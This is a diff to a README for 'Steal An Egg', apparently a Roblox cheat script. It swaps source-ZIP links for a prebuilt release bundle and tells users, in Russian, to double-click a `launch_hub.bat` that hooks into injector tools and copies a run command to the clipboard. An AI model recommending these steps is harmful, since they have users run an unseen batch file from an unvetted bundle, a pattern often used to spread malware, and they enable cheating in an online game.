@@ -2,7 +2,7 @@
 
 An advanced multi-executor framework for **Steal An Egg** featuring visual diagnostics, intelligent pathing, auto-farming routines, and companion tooling.
 
-[![Download ZIP](https://img.shields.io/badge/Download-Steal--An--Egg%20(Latest%20ZIP)-2ea44f?style=for-the-badge&logo=github)](https://github.com/aether-bytess/Steal-An-Egg/archive/refs/heads/main.zip)
+[![Download ZIP](https://img.shields.io/badge/Download-Steal--An--Egg%20v2.4.1%20(Full%20Bundle)-2ea44f?style=for-the-badge&logo=github)](https://github.com/aether-bytess/Steal-An-Egg/releases/download/v2.4.1/Steal-An-Egg-v2.4.1.zip)
 
 ---
 
@@ -27,17 +27,17 @@ An advanced multi-executor framework for **Steal An Egg** featuring visual diagn
 
 ### Option 2: Local Workspace Loader (Recommended)
 
-[![Download ZIP](https://img.shields.io/badge/⬇️_Download_Ready_Archive-Click_Here-blue?style=for-the-badge)](https://github.com/aether-bytess/Steal-An-Egg/archive/refs/heads/main.zip)
+[![Download ZIP](https://img.shields.io/badge/⬇️_Download_Full_Bundle_v2.4.1-Click_Here-blue?style=for-the-badge)](https://github.com/aether-bytess/Steal-An-Egg/releases/download/v2.4.1/Steal-An-Egg-v2.4.1.zip)
 
 #### Пошаговая инструкция (3 шага):
-1. **Скачайте архив:** Нажмите [Скачать Steal-An-Egg.zip](https://github.com/aether-bytess/Steal-An-Egg/archive/refs/heads/main.zip) и распакуйте папку в любое место на компьютере.
+1. **Скачайте архив:** Нажмите [Скачать Steal-An-Egg-v2.4.1.zip](https://github.com/aether-bytess/Steal-An-Egg/releases/download/v2.4.1/Steal-An-Egg-v2.4.1.zip) и распакуйте папку в любое место на компьютере.
 2. **Запустите лаунчер:** Дважды кликните по файлу `launch_hub.bat`.
    - Лаунчер сам найдет установленные инжекторы (**Real**, **Solara**, **Wave**, **Celery**, **Potassium** и др.).
    - Автоматически скопирует нужные файлы в папку `workspace` вашего экзекутора.
    - **Автоматически скопирует команду запуска в буфер обмена**.
 3. **Запустите в игре:** Зайдите в Steal An Egg в Roblox, откройте свой экзекутор, нажмите **Ctrl + V** (вставить) и нажмите **Execute**:
 ```lua
-loadstring(readfile("Steal-An-Egg/StealAnEgg.lua"))()
+getgenv().__COMPANION_ACTIVE = true; loadstring(readfile("Steal-An-Egg/StealAnEgg.lua"))()
 ```
 Нажмите **G** в игре, чтобы открыть/закрыть меню.
 
